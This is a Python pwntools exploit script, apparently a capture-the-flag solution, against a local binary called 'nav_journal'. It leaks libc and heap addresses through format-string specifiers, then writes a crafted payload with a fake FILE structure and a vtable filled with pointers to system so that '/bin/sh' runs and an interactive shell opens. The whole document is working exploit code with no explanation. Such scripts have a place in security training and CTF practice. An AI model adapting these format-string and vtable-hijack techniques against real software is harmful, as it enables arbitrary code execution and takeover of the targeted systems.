from pwn import *

system_offset = 0x3ada0

def create(name):
    p.sendlineafter(">",str(4))
    p.sendlineafter("[Y\N]:","N")
    p.sendlineafter("Enter your name:",name)
    p.recvuntil("/tmp/")
    
def write(desc) : 
    p.sendlineafter(">",str(5))
    p.sendafter("data:",desc)

p = process("./nav_journal")

if __name__ == "__main__" :
    p.sendlineafter("Enter your name:","aaaa")
    
    create("%5$p")
    libc = int(p.recvuntil("-")[2:10],16)-0x1ea918
    log.info(hex(libc))
    
    system = libc+system_offset
    
    p.sendline('7')
    create("%12$p")
    heap = int(p.recvuntil("-")[2:10],16)-0x6a0
    log.info(hex(heap))
    
    payload = "/bin/sh\x00"
    payload += p32(0)*16
    payload += p32(heap+0x98)
    payload += p32(0xffffffff)*2
    payload += p32(0) + p32(heap+0x98)
    payload += p32(0)*14
    payload += p32(heap+0xa0-1) + p32(0)*2
    payload += p32(0)*2 + p32(system)*14 # fake vtable 
    
    plen =  (0x604-len(payload))/4 - 1
    
    payload += p32(0)*plen + p32(heap+0x8)
    
    log.info(hex(len(payload)))
    pause()
    write(payload)
    
    p.sendline('3')
    
    p.interactive()

